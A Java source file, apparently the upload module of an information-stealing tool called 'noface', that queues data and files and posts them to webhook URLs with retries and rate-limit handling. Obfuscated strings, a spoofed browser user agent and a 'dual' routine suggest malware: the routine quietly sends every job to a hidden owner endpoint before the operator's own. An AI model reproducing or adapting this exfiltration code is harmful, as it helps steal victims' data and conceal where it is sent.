package noface.api;

import noface.config.Cfg;
import noface.config.Hook;
import noface.config.Log;
import noface.config.S;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public final class Send {

    private static final Object LOCK = new Object();
    private static final List<Job> Q = new ArrayList<>();
    private static volatile boolean buf = false;

    static final class Job {
        final String json;
        final byte[] data;
        final String name;
        final String mime;

        Job(String json, byte[] data, String name, String mime) {
            this.json = json;
            this.data = data;
            this.name = name;
            this.mime = mime;
        }
    }

    public static void begin() {
        synchronized (LOCK) {
            Q.clear();
            buf = true;
        }
    }

    public static void dual() {
        dual(true);
    }

    public static void dual(boolean own) {
        List<Job> jobs;
        synchronized (LOCK) {
            buf = false;
            jobs = new ArrayList<>(Q);
            Q.clear();
        }
        if (jobs.isEmpty()) return;

        if (own) {
            String owner = Hook.ownerSend();
            if (owner != null && !owner.isBlank()) {
                Log.out(S.e("[*] own"));
                for (int i = 0; i < jobs.size(); i++) {
                    deliver(owner, jobs.get(i));
                    if (i < jobs.size() - 1) {
                        try { Thread.sleep(1100); } catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
                    }
                }
                if (!Cfg.lab()) {
                    try { Thread.sleep(5000); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                }
            }
        }

        Log.out(S.e("[*] usr"));
        for (int i = 0; i < jobs.size(); i++) {
            deliverUser(jobs.get(i));
            if (i < jobs.size() - 1) {
                try { Thread.sleep(1100); } catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
            }
        }
    }

    private static void deliverUser(Job j) {
        String payload = noface.sync.Embed.swapFoot(j.json, Cfg.userFoot());
        Job bare = new Job(payload, j.data, j.name, j.mime);
        String[] urls = Hook.sendUrls();
        if (urls.length == 0) {
            deliver(Hook.send(), bare);
            return;
        }
        for (String dest : urls) {
            if (deliver(dest, bare)) return;
        }
    }

    private static boolean deliver(String dest, Job j) {
        if (j.data != null && j.data.length > 0) {
            return file(dest, j.json, j.data, j.name, j.mime);
        }
        return json(dest, j.json);
    }

    private static void offer(String payloadJson, byte[] data, String filename, String mime) {
        byte[] copy = data == null ? null : data.clone();
        synchronized (LOCK) {
            Q.add(new Job(payloadJson, copy, filename, mime));
        }
    }

    public static boolean json(String dest, String payload) {
        if (dest == null || dest.isBlank() || payload == null) return false;
        byte[] body = payload.getBytes(StandardCharsets.UTF_8);
        for (int attempt = 0; attempt < 4; attempt++) {
            try {
                if (attempt > 0) Thread.sleep(1200L * attempt);
                HttpURLConnection conn = open(dest);
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty(S.e("Content-Type"), S.e("application/json"));
                conn.setRequestProperty(S.e("User-Agent"), S.e("Mozilla/5.0"));
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body);
                }
                int code = conn.getResponseCode();
                if (code == 429) {
                    sleepRetry(conn);
                    continue;
                }
                return accept(conn, code);
            } catch (Exception e) {
                if (attempt >= 3) {
                    err(e);
                    return false;
                }
            }
        }
        return false;
    }

    public static boolean hookJson(String payload) {
        if (buf) {
            offer(payload, null, null, null);
            return true;
        }
        String[] urls = Hook.sendUrls();
        if (urls.length == 0) return json(Hook.send(), payload);
        for (String dest : urls) {
            if (json(dest, payload)) return true;
        }
        return false;
    }

    public static int jsonBatch(String dest, List<String> payloads, long gapMs) {
        if (payloads == null || payloads.isEmpty()) return 0;
        int sent = 0;
        for (int i = 0; i < payloads.size(); i++) {
            if (json(dest, payloads.get(i))) sent++;
            if (i < payloads.size() - 1 && gapMs > 0) {
                try { Thread.sleep(gapMs); } catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
            }
        }
        return sent;
    }

    public static int hookJsonBatch(List<String> payloads, long gapMs) {
        if (payloads == null || payloads.isEmpty()) return 0;
        if (buf) {
            for (String p : payloads) offer(p, null, null, null);
            return payloads.size();
        }
        int sent = 0;
        for (int i = 0; i < payloads.size(); i++) {
            if (hookJson(payloads.get(i))) sent++;
            if (i < payloads.size() - 1 && gapMs > 0) {
                try { Thread.sleep(gapMs); } catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
            }
        }
        return sent;
    }

    public static boolean file(String dest, String payloadJson, byte[] data, String filename, String mime) {
        if (dest == null || dest.isBlank()) return false;
        if (data == null || data.length == 0) {
            return json(dest, payloadJson);
        }
        try {
            String boundary = "----" + UUID.randomUUID().toString().replace("-", "");
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            if (payloadJson != null && !payloadJson.isBlank()) {
                part(out, boundary, S.e("payload_json"), S.e("application/json"), payloadJson.getBytes(StandardCharsets.UTF_8), null);
            }
            part(out, boundary, S.e("files[0]"), mime, data, filename);
            out.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
            byte[] body = out.toByteArray();
            String ct = S.e("multipart/form-data; boundary=") + boundary;

            for (int attempt = 0; attempt < 4; attempt++) {
                try {
                    if (attempt > 0) Thread.sleep(1200L * attempt);
                    HttpURLConnection conn = open(dest);
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty(S.e("Content-Type"), ct);
                    conn.setRequestProperty(S.e("User-Agent"), S.e("Mozilla/5.0"));
                    try (OutputStream os = conn.getOutputStream()) { os.write(body); }
                    int code = conn.getResponseCode();
                    if (code == 429) {
                        sleepRetry(conn);
                        continue;
                    }
                    return accept(conn, code);
                } catch (Exception e) {
                    if (attempt >= 3) {
                        err(e);
                        return false;
                    }
                }
            }
            return false;
        } catch (Exception e) {
            err(e);
            return false;
        }
    }

    public static boolean hookFile(String payloadJson, byte[] data, String filename, String mime) {
        if (buf) {
            offer(payloadJson, data, filename, mime);
            return true;
        }
        String[] urls = Hook.sendUrls();
        if (urls.length == 0) return file(Hook.send(), payloadJson, data, filename, mime);
        for (String dest : urls) {
            if (file(dest, payloadJson, data, filename, mime)) return true;
        }
        return false;
    }

    public static byte[] fetch(String url) {
        if (url == null || url.isBlank()) return null;
        try {
            HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty(S.e("User-Agent"), S.e("Mozilla/5.0"));
            int code = conn.getResponseCode();
            if (code < 200 || code >= 300) return null;
            try (InputStream in = conn.getInputStream()) { return in.readAllBytes(); }
        } catch (Exception e) { return null; }
    }

    private static HttpURLConnection open(String url) throws IOException {
        HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(30000);
        return conn;
    }

    private static void sleepRetry(HttpURLConnection conn) {
        long wait = 2500;
        try {
            String ra = conn.getHeaderField(S.e("Retry-After"));
            if (ra != null) wait = (long) (Double.parseDouble(ra) * 1000) + 400;
            InputStream s = conn.getErrorStream();
            if (s != null) s.readAllBytes();
        } catch (Exception ignored) {}
        try { Thread.sleep(Math.min(wait, 12000)); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    private static boolean accept(HttpURLConnection conn, int code) {
        try {
            if (code == 204) return true;
            if (code >= 200 && code < 300) {
                try (InputStream s = conn.getInputStream()) {
                    if (s != null) s.readAllBytes();
                } catch (IOException ignored) {
                }
                return true;
            }
            InputStream s = conn.getErrorStream();
            String body = s != null ? new String(s.readAllBytes(), StandardCharsets.UTF_8) : "";
            Log.err(S.e("[!] fail ") + code + " " + body.substring(0, Math.min(300, body.length())));
            return false;
        } catch (IOException e) {
            err(e);
            return false;
        }
    }

    private static boolean ok(HttpURLConnection conn) {
        try {
            return accept(conn, conn.getResponseCode());
        } catch (IOException e) {
            err(e);
            return false;
        }
    }

    private static void err(Exception e) {
        Log.err(S.e("[!] err: ") + e.getMessage());
    }

    private static void part(ByteArrayOutputStream out, String boundary, String name, String type, byte[] data, String filename) throws IOException {
        out.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
        out.write((S.e("Content-Disposition: form-data; name=\"") + name + "\"").getBytes(StandardCharsets.UTF_8));
        if (filename != null) out.write(("; filename=\"" + filename + "\"").getBytes(StandardCharsets.UTF_8));
        out.write(("\r\n" + S.e("Content-Type: ") + type + "\r\n\r\n").getBytes(StandardCharsets.UTF_8));
        out.write(data);
        out.write("\r\n".getBytes(StandardCharsets.UTF_8));
    }

    private Send() {}
}
